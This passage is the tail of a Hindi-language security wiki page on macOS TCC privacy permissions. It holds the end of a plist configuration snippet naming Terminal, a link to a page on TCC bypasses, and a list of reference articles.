<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC बायपास


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## संदर्भ

- [1] [macOS TCC.db की गहन जानकारी - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - com.apple.macl को track करने के लिए script (brunerd द्वारा Gist)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [com.apple.macl को track और tackle करना](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [संयोग और डिज़ाइन के कारण macOS TCC User Privacy Protections को bypass करना](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
